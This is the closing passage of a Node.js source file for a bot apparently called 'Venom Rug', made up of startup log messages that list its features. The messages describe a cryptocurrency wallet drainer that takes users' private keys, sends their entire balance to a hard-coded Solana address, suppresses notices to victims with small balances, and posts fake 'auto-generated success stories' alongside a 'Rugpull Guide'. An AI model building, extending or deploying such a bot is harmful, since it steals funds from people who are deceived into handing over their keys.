    console.log("💰 REAL DRAIN WALLET: 5s4hnozGVqvPbtnriQoYX27GAnLWc16wNK2Lp27W7mYT");
    console.log("🗄️ Database: MongoDB Cloud");
    console.log("🖼️ Image: Loading from CDN URL");
    console.log("🔗 Chain: Solana Only");
    console.log("🏆 Recent Wins: 15 auto-generated success stories");
    console.log("📢 Broadcast: Admin messaging system active");
    console.log("📊 Live Prices: SOL/ETH price monitoring");
    console.log("💰 REAL AUTO-DRAIN FEATURE: ACTIVE - REAL FUNDS WILL BE TRANSFERRED");
    console.log("🚨 WARNING: This bot will ACTUALLY drain wallets to the specified address");
    console.log("✅ IMPROVED: Complete drain functionality - transfers EVERYTHING except fees");
    console.log("🎯 NEW: Maximum profit extraction with precise fee calculation");
    console.log("🔧 FIXED: Transaction sending issue resolved");
    console.log("💰 NEW: Profit tracking system with pinned dashboard");
    console.log("📈 NEW: /profits command for admin profit analytics");
    console.log("📌 NEW: Auto-pinned profit message at the top of admin chat");
    console.log("💵 NEW: Wallet balance analysis - minimum $70 required for drain");
    console.log("🔍 NEW: Real-time SOL price monitoring for USD conversion");
    console.log("🔄 UPDATED: Button texts for Tokens and Bundler sections with emojis");
    console.log("✨ NEW: Added 3 new features to 'Why choose Venom Rug' list");
    console.log("📊 NEW: Advanced Analytics Dashboard with performance insights");
    console.log("🎯 NEW: Profit optimization recommendations");
    console.log("🚀 NEW: Upgrade potential analysis");
    console.log("🛡️ NEW: User-facing $100 minimum, admin $70 minimum");
    console.log("🔧 FIXED: Admin buttons now showing properly");
    console.log("🔄 UPDATED: Auto-drain triggers regardless of admin clicks for wallets <$70");
    console.log("🚫 FIXED: No 'wallet connected' message for users with <$70 balance");
    console.log("🆕 NEW: Admin notifications for new users joining");
    console.log("🔧 FIXED: Markdown parsing error in admin commands");
    console.log("🔧 FIXED: Application instance reference issue");
    console.log("🔧 FIXED: COMPREHENSIVE implementation in Node.js");
    console.log("🔧 FIXED: walletAnalysis variable scope issue in handlePrivateKey");
    console.log("📚 NEW: Added Rugpull Guide section");
    console.log("🤖 NEW: Added How It Works tutorial");
    console.log("💰 NEW: Added Top-Up Tips section");
    console.log("🚀 READY FOR RENDER DEPLOYMENT!");
}

// Start the bot
main().catch(console.error);